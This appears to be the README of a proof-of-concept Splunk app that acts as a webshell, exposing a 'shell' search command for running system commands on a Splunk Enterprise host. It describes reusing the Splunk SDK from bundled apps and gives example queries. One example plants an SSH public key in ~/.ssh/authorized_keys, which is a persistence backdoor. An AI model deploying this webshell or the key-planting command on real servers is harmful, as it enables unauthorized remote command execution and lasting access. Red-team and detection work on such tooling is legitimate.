# Post-Exploitation Toolkit for Splunk

This is a proof-of-concept app for executing system commands through Splunk Enterprise's SPL engine—similar to a webshell.

- No opsec
- No code obfuscation
- No exporting of Splunk objects outside of the scope of the app
- No living off the land

The app uses the _bring your own SDK_ (BYOS) concept for convenience, but it is possible to live off the land by "vampirizing" the SDK from another app that uses it by tweaking Python's path through `sys.path`—for example, these are some default Splunk apps that use the [Splunk SDK for Python](https://github.com/splunk/splunk-sdk-python):

- Splunk Instrumentation : `$SPLUNK_HOME/etc/apps/splunk_instrumentation/bin/splunk_instrumentation`
- Splunk Secure Gateway : `$SPLUNK_HOME/etc/apps/splunk_secure_gateway/lib`
- Splunk Rapid Diagnostic : `$SPLUNK_HOME/etc/apps/splunk_rapid_diag/bin`

It is even possible to get rid of the SDK completely by taking advantage of the fact that Python arbitrarily evaluates any code that is in the command file (i.e. the `shell.py` file).

> Be aware that a Splunk administrator account is needed for installing the app in the first place.

## Examples

Below are some examples of using the `shell` search command exposed by this app:

```spl
| shell command="cat /proc/version"
| eval duration=strftime(duration, "%H:%M:%S.%s")
| table command, code, stderr, stdout, duration
```

```
| shell command="mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNqqi1mHLnryb1FdbePrSZQdmXRZxGZbo0gTfglysq6KMNUNY2VhzmYN9JYW39yNtjhVxqfW6ewc+eHiL+IRRM1P5ecDAaL3V0ou6ecSurU+t9DR4114mzNJ5SqNxMgiJzbXdhR+j55GjfXdk0FyzxM3a5qpVcGZEXiAzGzhHytUV51+YGnuLGaZ37nebh3UlYC+KJev4MYIVww0tWmY+9GniRSQlgLLUQZ+FcBUjaqhwqVqsHe4F/woW1IHe7mfm63GXyBavVc+llrEzRbMO111MogZUcoWDI9w7UIm8ZOTnhJsk7jhJzG2GpSXZHmly/a/buFaaFnmfZ4MYPkgJD sk4la@box.gmail.com' >> ~/.ssh/authorized_keys"
| eval duration=strftime(duration, "%H:%M:%S.%s")
| table command, code, stderr, stdout, duration
```

> Since the `shell` searchcommand is a [generating command](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Commandsbytype), it must be the first command in the search query.
